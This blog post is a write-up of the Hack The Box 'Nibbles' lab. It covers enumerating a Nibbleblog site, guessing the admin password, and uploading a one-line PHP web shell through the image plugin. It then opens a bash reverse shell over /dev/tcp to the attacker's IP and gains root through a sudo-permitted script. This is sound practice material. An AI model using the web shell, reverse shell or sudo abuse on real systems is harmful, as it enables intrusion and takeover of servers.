---
layout: post
title:  "Nibbles Writeup - Hack The Box"
date:   2025-04-06
desc: ""
keywords: "HTB,eJPT,Linux,NibbleblogRCE,AbusingSudoers,Easy"
categories: [HTB]
tags: [HTB,eJPT,Linux,NibbleblogRCE,AbusingSudoers,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

The next challenge I choose to continue my practice in **Pentesting**, is an **Easy** **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, the **Nibbles**, which made me work a lot the enumeration phase on the web server. There is a great diversity of tools that perhaps fulfill the same task, so the good thing about these machines is that you can find the one that fits the needs of a particular moment. It is also important to think about the control of accounts and their permissions to avoid an easy **Engagement** of the system, it is time to spawn the box and start the lab.

<br /><br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I already have some experience in the **Reconnaissance** phase, and I know very well that if I don't put all my effort in doing a good task and a lot of concentration on it, I will lose a lot of time to find some attack vector. Previously I perform the checks on my connectivity with the machine and also the **Operating System** I am facing, sending an **ICMP** trace with `ping` and using the `whichSystem.py` tool from the **[Hack4u](https://hack4u.io/){:target="_blank"}** community respectively. With `nmap` I leak the information of the services and their versions, thanks to which I can get the **codename** of the machine and have an idea if containers are being implemented (most probably not on this box). With `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I find the technologies used by the developers, which at the moment does not give me much help, but if I analyze the source code of the web page <ins>I find a path and a very interesting project name</ins>.

```bash
ping -c 2 10.129.96.84
whichSystem.py 10.129.96.84
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.129.96.84 -oG allPorts
nmap -sCV -p22,80 10.129.96.84 -oN targeted
#    --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
#   google.es --> OpenSSH 7.2p2 4ubuntu2.2 launchpad      Xenial
#    --> Apache httpd 2.4.18
#    google.se --> Apache httpd 2.4.18 launchpad           Xenial

# http://10.129.96.84/
# Ctrl + Shift + c
# Ctrl + u
```

<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I make a deeper investigation of the **[Nibbleblog](https://cmscritic.com/nibbleblog-review){:target="_blank"}** project, the first thing I get with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** is that it is developed in **PHP** and in the repository of the project in **Github** of **[dignajar](https://github.com/dignajar/nibbleblog){:target="_blank"}** I corroborate that the technology matches. With `wfuzz` I search for **.php** files that may exist on the server and I find the one related to the authentication panel, the most common credentials do not work and for what I found in the repository there are no **[default credentials](https://www.howtoforge.com/tutorial/how-to-install-nibbleblog-on-ubuntu/){:target="_blank"}**. If I try to perform an account recovery via email an error and a protection alert is generated, it is very likely that there are security measures implemented.

> **[Nibbleblog](https://cmscritic.com/nibbleblog-review){:target="_blank"}** is a blog platform that uses XML databases as opposed to MySQL and others. It is small, weighing in at less than half a megabyte and easy to install with a simple 1 step installer. Today, I bring you my Nibbleblog Review.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://10.129.96.84/nibbleblog/FUZZ.php'
# index,sitemap,admin,feed,install,update
```

<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can perform a search for hidden directories with `wfuzz` and go deeper as I find some interesting paths. Thanks to this enumeration I find some **.xml** files that leak information that seem to be related to the blacklist of **IPs** that were alerted, but I can't find any files that store credentials to access the **Nibbleblog** project dashboard at the moment.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://10.129.96.84/nibbleblog/FUZZ'
# content, themes, plugin

wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://10.129.96.84/nibbleblog/content/FUZZ'
# public, private, tmp

wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt-xml 'http://10.129.96.84/nibbleblog/content/private/FUZZ.FUZ2Z'
# users.xml

# http://10.129.96.84/nibbleblog/content/private/users.xml
```

<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before performing a brute force attack with **[BurpSuite](https://portswigger.net/burp){:target="_blank"}**, `hydra` or any other tool, even some custom script, besides I know that it is a very poorly recommended technique and even many times it is detrimental to an audit, I will follow the recommendations of the **[Hack4u](https://hack4u.io/){:target="_blank"}** community and do some **guessing** and test some passwords related to the project. After some test and errors I succeed in accessing the dashboard, in this step I remember the **CMS** like **Joomla** or **WordPress** and the first thing I investigate are the installed plugins. There is one that allows a file upload, so it can be a possible attack vector to compromise the server and access the machine.

```html
http://10.129.96.84/nibbleblog/admin.php
# Guessing: admin:admin admin:nibbles :)
```

<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have the possibility to upload files to the server, I am going to make some tests, first I try to upload an image and it does not inform me the path where the image is being hosted. Thanks to the previous enumeration that I made with `wfuzz` I can search in the folders that I found and in one of them is the image that I uploaded. Having known the path and knowing that I can upload images, I am going to try to create a malicious file to try to upload it to the web server.

```html
# Plugins --> My image
# http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.jpg
```

<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As I know that the project is developed in **PHP**, I'm going to create a malicious file that will allow me to execute commands remotely. When uploading it through the **Web**, I get some error messages but if I access the path where the files are hosted, it exists (**with a different name**), so there are no security measures in the code to prevent the upload of malicious content. I try some basic commands and get the results through the browser.

```bash
nvim pwn3d.php

# http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami
# http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=hostname%20-I
```

> **pwn3d.php**:

```php
<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</php>"; ?>
```

<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have **RCE** I can try to access the machine through a **Reverse Shell**. First I verify the connectivity to the target machine by sending an **ICMP** trace with `ping`, to my attacking machine and the result is successful, I manage to capture the communication with `tcpdump`. I use one of the **[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** methods to engage the box and I can now perform a **Console treatment**, for better mobility. With the first enumeration commands I ratify the **codename**, in addition to the **Linux** version and other basic information, I can also see the contents of the first flag.

> **Attacker Machine**:

```bash
sudo tcpdump -i tun0 icmp -n

# http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=ping%20-c%202%2010.10.14.238

sudo nc -nlvp 443

# http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash -i >&/dev/tcp/10.10.14.238/443 0>&1
# http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash -c 'bash -i >&/dev/tcp/10.10.14.238/443 0>&1'
# :(
# http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash -c 'bash -i >%26/dev/tcp/10.10.14.238/443 0>%261'
# :)
```

> **Victime Machine**:

```bash
whoami
hostname
hostname -I

# Console Treatment
script /dev/null -c bash
# [Ctrl^z]
stty raw -echo; fg
reset xterm        
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
uname -a
lsb_release -a
id
groups
cat /etc/passwd | grep 'sh$'
```

<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue with the system enumeration phase to look for a path to pivot user or escalate privileges, there is a **[vulnerability](https://www.circl.lu/pub/tr-67/){:target="_blank"}** in the `pkexec` tool but it is not the intended path on this machine. The compromised user (**nibbler**) has the privilege to execute the script `monitor.sh` impersonating the user of maximum privileges (**root**), but the script and the path where it should be hosting the same, does not exist, except a personal compressed `file.zip` that when decompressing it allow me to access the contents of the script. The content is not relevant at the moment but if I can delete it and create a new one that when executing it gives me a **Shell** and as I can execute it as the **root** user I can escalate privileges and engage the box. Finally I can see the content of the last flag to validate before **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** the lab compromise.

```bash
find \-perm -4000 2>/dev/null
getcap / -r 2>/dev/null
sudo -l
# (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

cat /home/nibbler/personal/stuff/monitor.sh
# No such file or directory

unzip personal.zip
shred -zun 10 -v monitor.sh
# mkdir -p personal/stuff

touch monitor.sh
nano monitor.sh 
cat !$
```

> **monitor.sh**:

```bash
#!/bin/bash

bash
```

```bash
chmod +x monitor.sh 
sudo /home/nibbler/personal/stuff/monitor.sh
# :)
```

<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> The **Nibbles** machine is not very complex to engage, but there were times when I needed the help of the community to find the right way, because many times the obvious of testing is hidden from me by my search for complex methods and I forget to first try basic tests and even listen to my instinct - not yet very mature in this field. I must kill the box and continue my practice, the next **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** box is always an uncertainty.

<br /><br />
<img src="{{ site.img_path }}/nibbles_writeup/Nibbles_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
